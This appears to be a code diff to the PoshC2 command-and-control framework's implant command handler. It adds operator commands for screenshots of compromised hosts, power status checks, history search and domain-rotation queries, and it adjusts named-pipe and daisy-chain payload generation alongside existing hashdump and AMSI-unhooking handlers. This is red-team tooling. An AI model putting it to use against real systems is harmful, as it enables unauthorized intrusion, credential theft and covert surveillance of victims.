@@ -10,12 +10,14 @@ from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfhe
 from poshc2.server.AutoLoads import check_module_loaded, run_autoloads
 from poshc2.client.Help import posh_help
 from poshc2.server.Config import PayloadsDirectory, PoshInstallDirectory, PoshProjectDirectory, SocksHost, ModulesDirectory, DomainFrontHeader, PayloadCommsHost
+from poshc2.server.Config import PBindSecret, PBindPipeName
 from poshc2.server.Core import print_bad, creds, print_good
 from poshc2.client.Opsec import ps_opsec
 from poshc2.server.payloads.Payloads import Payloads
+from poshc2.server.PowerStatus import getpowerstatus
 from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
 from poshc2.server.database.DB import new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
-from poshc2.server.database.DB import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails
+from poshc2.server.database.DB import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails, get_powerstatusbyrandomuri
 
 
 def handle_ps_command(command, user, randomuri, implant_id):
@@ -47,6 +49,9 @@ def handle_ps_command(command, user, randomuri, implant_id):
 
     if command.startswith("unhook-amsi"):
         do_unhook_amsi(user, command, randomuri)
+        return
+    elif command.startswith("searchhistory"):
+        do_searchhistory(user, command, randomuri)
         return
     elif command.startswith("searchhelp"):
         do_searchhelp(user, command, randomuri)
@@ -132,8 +137,20 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command == "ps":
         do_ps(user, command, randomuri)
         return
+    elif command == "get-screenshotmulti":
+        do_get_screenshotmulti(user, command, randomuri)
+        return
+    elif command == "get-powerstatus":
+        do_get_powerstatus(user, command, randomuri)
+        return
+    elif command == "get-screenshot":
+        do_get_screenshot(user, command, randomuri)
+        return
     elif command == "hashdump":
         do_hashdump(user, command, randomuri)
+        return
+    elif command == "loadpowerstatus":
+        do_loadpowerstatus(user, command, randomuri)
         return
     elif command == "stopdaisy":
         do_stopdaisy(user, command, randomuri)
@@ -146,6 +163,9 @@ def handle_ps_command(command, user, randomuri, implant_id):
         return
     elif (command.startswith("enable-rotation")):
         do_rotation(user, command, randomuri)
+        return
+    elif (command.startswith("get-rotation")):
+        do_get_rotation(user, command, randomuri)
         return
     elif command.startswith("reversedns"):
         do_reversedns(user, command, randomuri)
@@ -164,6 +184,14 @@ def handle_ps_command(command, user, randomuri, implant_id):
 
 def do_unhook_amsi(user, command, randomuri):
     new_task("unhook", user, randomuri)
+
+
+def do_searchhistory(user, command, randomuri):
+    searchterm = (command).replace("searchhistory ", "")
+    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
+        for line in hisfile:
+            if searchterm in line.lower():
+                print(Colours.GREEN + line.replace("+", ""))
 
 
 def do_searchhelp(user, command, randomuri):
@@ -286,7 +314,7 @@ def do_invoke_wmijspbindpayload(user, command, randomuri):
     C2 = get_c2server_all()
     print()
     print("To connect to the SMB named pipe use the following command:")
-    print(Colours.GREEN + "invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0], C2.EncKey) + Colours.END)
+    print(f"{Colours.GREEN}invoke-pbind -target {target[0]} -secret {PBindSecret} -key {C2.EncKey} -pname {PBindPipeName} -client{Colours.END}")
     print()
     print("To issue commands to the SMB named pipe use the following command:")
     print(Colours.GREEN + "pbind-command \"pwd\"" + Colours.END)
@@ -611,6 +639,7 @@ def do_reversedns(user, command, randomuri):
     params = params.sub("", command)
     new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)
 
+
 def do_rotation(user, command, randomuri):
     domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
     domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
@@ -622,7 +651,35 @@ def do_get_rotation(user, command, randomuri):
     new_task("get-variable -name rotdf", user, randomuri)
     new_task("get-variable -name rotate", user, randomuri)
 
+
 def do_shell(user, command, randomuri):
+    new_task(command, user, randomuri)
+
+
+def do_get_screenshotmulti(user, command, randomuri):
+    pwrStatus = get_powerstatusbyrandomuri(randomuri)
+    if (pwrStatus is not None and pwrStatus[7]):
+        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+        if ri.lower() == "n" or ri.lower() == "":
+            return
+    new_task(command, user, randomuri)
+
+
+def do_get_screenshot(user, command, randomuri):
+    pwrStatus = get_powerstatusbyrandomuri(randomuri)
+    if (pwrStatus is not None and pwrStatus[7]):
+        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+        if ri.lower() == "n" or ri.lower() == "":
+            return
+    new_task(command, user, randomuri)
+
+
+def do_get_powerstatus(user, command, randomuri):
+    getpowerstatus(randomuri)
+
+
+def do_loadpowerstatus(user, command, randomuri):
+    update_label("PSM", randomuri)
     new_task(command, user, randomuri)
 
 
@@ -705,8 +762,8 @@ def do_startdaisy(user, command, randomuri):
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
-        urlId = new_urldetails(name, f"http://{bind_ip}:{bind_port}", C2.DomainFrontHeader, proxy_url, proxy_user, proxy_pass, cred_expiry)
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, URLID = urlId, PowerShellProxyCommand=proxynone)
+        urlId = new_urldetails(name, f"\"http://{bind_ip}:{bind_port}\"", "\"\"", proxy_url, proxy_user, proxy_pass, cred_expiry)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, URLID=urlId, PowerShellProxyCommand=proxynone)
         newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
         newPayload.CreateDroppers(name)
         newPayload.CreateRaw(name)
@@ -714,7 +771,6 @@ def do_startdaisy(user, command, randomuri):
         newPayload.CreateShellcode(name)
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
-        newPayload.CreateCS(name)
         print_good("Created new %s daisy payloads" % name)
 
 
